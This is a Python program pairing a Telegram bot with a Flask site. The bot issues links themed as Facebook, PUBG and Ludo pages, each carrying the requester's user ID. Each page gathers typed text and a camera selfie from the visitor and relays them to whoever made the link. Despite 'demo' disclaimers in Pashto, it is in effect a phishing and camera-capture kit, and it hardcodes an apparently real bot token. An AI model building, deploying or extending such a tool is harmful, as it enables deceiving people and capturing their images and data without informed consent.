import io, threading
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import Bot, Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# ========= CONFIG =========
BOT_TOKEN = "7975528068:AAFrXMynUlYZsqBgSvP1maZgznryBxBIgOE"
PUBLIC_BASE = "http://127.0.0.1:8081"  # وروسته د Cloudflare لینک دلته واچوه
PORT = 8081

bot = Bot(BOT_TOKEN)
app = Flask(__name__)

# ========= TELEGRAM BOT =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [["🔵 Facebook Demo","🎮 PUBG Demo","🎲 Ludo Demo"]]
    await update.message.reply_text(
        "👋 سلام!\n"
        "دا **قانوني DEMO** دی.\n"
        "ریښتیني معلومات مه داخلوئ.\n\n"
        "له مینو څخه انتخاب وکړه 👇",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    t = update.message.text
    if "Facebook" in t:
        link = f"{PUBLIC_BASE}/demo/facebook?uid={uid}"
    elif "PUBG" in t:
        link = f"{PUBLIC_BASE}/demo/pubg?uid={uid}"
    elif "Ludo" in t:
        link = f"{PUBLIC_BASE}/demo/ludo?uid={uid}"
    else:
        return
    await update.message.reply_text(f"🔗 Demo Link:\n{link}")

def run_bot():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu))
    application.run_polling()

# ========= WEB TEMPLATES =========
PAGE = """
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{title}}</title>
<style>
body{font-family:sans-serif;padding:16px;background:#f7f7f7}
.card{background:#fff;border-radius:12px;padding:14px;box-shadow:0 6px 18px rgba(0,0,0,.08)}
.warn{background:#ffe0e0;padding:12px;border-radius:10px;margin-bottom:12px}
h2{margin-top:0}
button{padding:10px 14px;font-size:16px;border-radius:10px;border:0;background:#2563eb;color:#fff}
.secondary{background:#111827}
video,img{width:100%;max-width:420px;border-radius:12px;margin-top:8px}
textarea{width:100%;border-radius:10px;padding:10px}
</style>
</head>
<body>
<div class="card">
  <div class="warn">
    ⚠️ DEMO – دا رښتینی لوګین نه دی.<br>
    مهرباني وکړئ رښتیني معلومات مه داخلوئ.
  </div>
  <h2>{{title}}</h2>

  <label>📝 Demo Text (Pashto/English):</label>
  <textarea id="txt" rows="4" placeholder="دلته فیک متن ولیکئ…"></textarea>

  <div style="margin:10px 0">
    <button onclick="openCam()">📸 Open Camera</button>
  </div>

  <video id="v" autoplay playsinline></video>
  <button class="secondary" onclick="take()">Take Photo</button>
  <img id="p">

  <div style="margin-top:12px">
    <button onclick="send()">📤 Send to Bot</button>
  </div>
</div>

<script>
let stream, blob;
async function openCam(){
  stream = await navigator.mediaDevices.getUserMedia({video:true});
  v.srcObject = stream;
}
function take(){
  const c=document.createElement('canvas');
  c.width=v.videoWidth; c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  c.toBlob(b=>blob=b,'image/jpeg');
  p.src=URL.createObjectURL(blob);
}
async function send(){
  const f=new FormData();
  f.append('uid', new URLSearchParams(location.search).get('uid'));
  f.append('page', "{{title}}");
  f.append('text', document.getElementById('txt').value);
  if(blob) f.append('photo', blob);
  await fetch('/submit',{method:'POST',body:f});
  alert('Sent to bot ✅');
}
</script>
</body>
</html>
"""

@app.route("/demo/<name>")
def demo(name):
    title = {
        "facebook":"Facebook Demo",
        "pubg":"PUBG Demo",
        "ludo":"Ludo Demo"
    }.get(name,"Demo")
    return render_template_string(PAGE, title=title)

@app.route("/submit", methods=["POST"])
def submit():
    uid = int(request.form.get("uid"))
    page = request.form.get("page","Demo")
    text = request.form.get("text","")
    photo = request.files.get("photo")

    msg = (
        f"🧪 {page}\n"
        f"🆔 UserID: {uid}\n"
        f"⏰ Time: {datetime.now()}\n\n"
        f"📝 Text:\n{text}"
    )
    bot.send_message(chat_id=uid, text=msg)

    if photo:
        bio = io.BytesIO(photo.read())
        bio.name = "selfie.jpg"
        bot.send_photo(chat_id=uid, photo=bio, caption=f"📷 {page} Selfie")

    return "OK"

# ========= RUN =========
if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=PORT)
